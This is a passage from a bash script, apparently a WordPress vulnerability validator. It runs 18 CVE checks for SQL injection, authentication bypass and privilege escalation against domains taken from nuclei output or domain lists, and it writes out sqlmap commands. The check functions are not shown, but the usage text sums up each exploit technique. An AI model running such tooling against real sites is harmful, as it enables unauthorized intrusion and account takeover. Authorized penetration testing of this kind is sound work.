    echo -e "\n${BOLD}${CYAN}============================================${NC}"
    echo -e "${BOLD}  Target: ${DOMAIN}${NC}"
    [ -n "$CVE_HINT" ] && echo -e "${BOLD}  CVE hint: ${CVE_HINT}${NC}"
    echo -e "${CYAN}============================================${NC}"

    if [ -n "$CVE_HINT" ]; then
        case "$CVE_HINT" in
            *2024-27956*)  check_cve_2024_27956  "$BASE_URL" "$DOMAIN" ;;
            *2024-1071*)   check_cve_2024_1071   "$BASE_URL" "$DOMAIN" ;;
            *2024-1698*)   check_cve_2024_1698   "$BASE_URL" "$DOMAIN" ;;
            *2023-32243*)  check_cve_2023_32243  "$BASE_URL" "$DOMAIN" ;;
            *2023-3460*)   check_cve_2023_3460   "$BASE_URL" "$DOMAIN" ;;
            *2024-10924*)  check_cve_2024_10924  "$BASE_URL" "$DOMAIN" ;;
            *2023-28121*)  check_cve_2023_28121  "$BASE_URL" "$DOMAIN" ;;
            *2024-28000*)  check_cve_2024_28000  "$BASE_URL" "$DOMAIN" ;;
            *2020-8772*)   check_cve_2020_8772   "$BASE_URL" "$DOMAIN" ;;
            *2023-3076*)   check_cve_2023_3076   "$BASE_URL" "$DOMAIN" ;;
            *2023-2449*)   check_cve_2023_2449   "$BASE_URL" "$DOMAIN" ;;
            *2023-2437*)   check_cve_2023_2437   "$BASE_URL" "$DOMAIN" ;;
            *2023-6009*)   check_cve_2023_6009   "$BASE_URL" "$DOMAIN" ;;
            *2024-35700*)  check_cve_2024_35700  "$BASE_URL" "$DOMAIN" ;;
            *2024-9863*)   check_cve_2024_9863   "$BASE_URL" "$DOMAIN" ;;
            *2025-8489*)   check_cve_2025_8489   "$BASE_URL" "$DOMAIN" ;;
            *2026-1492*)   check_cve_2026_1492   "$BASE_URL" "$DOMAIN" ;;
            *2017-8295*)   check_cve_2017_8295   "$BASE_URL" "$DOMAIN" ;;
            *) echo -e "${RED}  Unknown CVE: ${CVE_HINT}${NC}" ;;
        esac
    else
        check_cve_2024_27956  "$BASE_URL" "$DOMAIN"
        check_cve_2024_1071   "$BASE_URL" "$DOMAIN"
        check_cve_2024_1698   "$BASE_URL" "$DOMAIN"
        check_cve_2023_32243  "$BASE_URL" "$DOMAIN"
        check_cve_2023_3460   "$BASE_URL" "$DOMAIN"
        check_cve_2024_10924  "$BASE_URL" "$DOMAIN"
        check_cve_2023_28121  "$BASE_URL" "$DOMAIN"
        check_cve_2024_28000  "$BASE_URL" "$DOMAIN"
        check_cve_2020_8772   "$BASE_URL" "$DOMAIN"
        check_cve_2023_3076   "$BASE_URL" "$DOMAIN"
        check_cve_2023_2449   "$BASE_URL" "$DOMAIN"
        check_cve_2023_2437   "$BASE_URL" "$DOMAIN"
        check_cve_2023_6009   "$BASE_URL" "$DOMAIN"
        check_cve_2024_35700  "$BASE_URL" "$DOMAIN"
        check_cve_2024_9863   "$BASE_URL" "$DOMAIN"
        check_cve_2025_8489   "$BASE_URL" "$DOMAIN"
        check_cve_2026_1492   "$BASE_URL" "$DOMAIN"
        check_cve_2017_8295   "$BASE_URL" "$DOMAIN"
    fi
}

# ============================================
# Entry point
# ============================================
if [ "${#POSITIONAL[@]}" -eq 0 ]; then
    echo "Usage: $0 [-o output_dir] [--csv] <nuclei_output.txt | url>"
    echo ""
    echo "Options:"
    echo "  -o DIR    Save results to DIR (created if not exists)"
    echo "            Default: /tmp/wp_validate_YYYYMMDD_HHMMSS"
    echo "  --csv     Also write results.csv with domain,cve,type,payload,status columns"
    echo ""
    echo "Examples:"
    echo "  $0 https://target.com                        # Run ALL 18 checks"
    echo "  $0 nuclei_results.txt                        # Auto-detect CVE from nuclei output"
    echo "  $0 -o ./wp_results nuclei_results.txt        # Save to ./wp_results/"
    echo "  $0 --csv -o ./out nuclei_results.txt         # CSV output"
    echo ""
    echo "Supported checks (18):"
    echo ""
    echo "  SQLi — time-based (3):"
    echo "  CVE-2024-27956  WP Automatic (q UNION+SLEEP)"
    echo "  CVE-2024-1071   Ultimate Member (sorting SLEEP)"
    echo "  CVE-2024-1698   NotificationX (type SLEEP)"
    echo ""
    echo "  Auth Bypass (6):"
    echo "  CVE-2023-32243  Essential Addons (password reset no token)"
    echo "  CVE-2024-10924  Really Simple Security (2FA user_id bypass)"
    echo "  CVE-2023-28121  WooCommerce Payments (X-WCPAY-PLATFORM-CHECKOUT-USER)"
    echo "  CVE-2020-8772   InfiniteWP Client (base64 JSON bypass)"
    echo "  CVE-2023-2449   UserPro (plaintext token in wp_usermeta)"
    echo "  CVE-2023-2437   UserPro (Facebook login token not validated)"
    echo ""
    echo "  Privilege Escalation (8):"
    echo "  CVE-2023-3460   Ultimate Member (um-role=administrator registration)"
    echo "  CVE-2024-28000  LiteSpeed Cache (weak hash spoofing)"
    echo "  CVE-2023-3076   MStore API (role=administrator via REST)"
    echo "  CVE-2023-6009   UserPro (wp_capabilities via profile update)"
    echo "  CVE-2024-35700  UserPro (password reset logic flaw)"
    echo "  CVE-2024-9863   UserPro (default admin role on registration)"
    echo "  CVE-2025-8489   King Addons (role=administrator via REST)"
    echo "  CVE-2026-1492   User Registration & Membership (role injection)"
    echo ""
    echo "  Other (1):"
    echo "  CVE-2017-8295   WP Core (Host Header in password reset email)"
    exit 1
fi

echo -e "${BOLD}${CYAN}============================================${NC}"
echo -e "${BOLD}  WordPress Universal Vulnerability Validator${NC}"
echo -e "${BOLD}  18 checks: 3x SQLi | 6x AuthBypass | 8x Privesc | 1x Other${NC}"
echo -e "${BOLD}  Output: ${OUTDIR}${NC}"
[ "$CSV_MODE" -eq 1 ] && echo -e "${BOLD}  CSV mode: ON → ${CSV_FILE}${NC}"
echo -e "${CYAN}============================================${NC}"

INPUT="${POSITIONAL[0]}"

if [ -f "$INPUT" ]; then
    if grep -qP '^\[' "$INPUT"; then
        echo -e "${YELLOW}Nuclei output detected — auto-routing by template ID${NC}"
        SEEN_PAIRS=""
        while IFS= read -r line; do
            TMPL_ID=$(echo "$line" | grep -oP '^\[([^\]]+)\]' | tr -d '[]')
            URL=$(echo "$line" | grep -oP 'https?://[^\s]+')
            DOMAIN=$(echo "$URL" | grep -oP 'https?://[^/\s]+')
            [ -z "$TMPL_ID" ] || [ -z "$DOMAIN" ] && continue

            PAIR="${DOMAIN}|${TMPL_ID}"
            if echo "$SEEN_PAIRS" | grep -qF "$PAIR"; then
                continue
            fi
            SEEN_PAIRS="${SEEN_PAIRS}${PAIR}"$'\n'

            validate_domain "$DOMAIN" "$TMPL_ID"
        done < "$INPUT"
    else
        echo -e "${YELLOW}Domain list detected — running ALL checks on each line${NC}"
        while IFS= read -r line; do
            line=$(echo "$line" | tr -d '[:space:]')
            [ -z "$line" ] && continue
            [[ "$line" =~ ^# ]] && continue
            [[ "$line" =~ ^https?:// ]] || line="https://${line}"
            validate_domain "$line"
        done < "$INPUT"
    fi
else
    TARGET="$INPUT"
    [[ "$TARGET" =~ ^https?:// ]] || TARGET="https://${TARGET}"
    validate_domain "$TARGET"
fi

echo -e "\n${BOLD}${CYAN}============================================${NC}"
echo -e "${BOLD}  Scan complete — Results: ${OUTDIR}${NC}"
echo -e "${CYAN}============================================${NC}"

if [ -f "$RESULTS_FILE" ] && [ -s "$RESULTS_FILE" ]; then
    echo -e "\n${RED}${BOLD}  VULNERABLE:${NC}"
    while IFS= read -r l; do echo -e "  ${RED}${l}${NC}"; done < "$RESULTS_FILE"
fi

if [ -f "$SQLMAP_FILE" ] && [ -s "$SQLMAP_FILE" ]; then
    echo -e "\n${YELLOW}  SQLmap commands → ${SQLMAP_FILE}${NC}"
fi

if [ "$CSV_MODE" -eq 1 ] && [ -f "$CSV_FILE" ]; then
    ROWS=$(wc -l < "$CSV_FILE")
    echo -e "${YELLOW}  CSV → ${CSV_FILE} (${ROWS} rows)${NC}"
fi
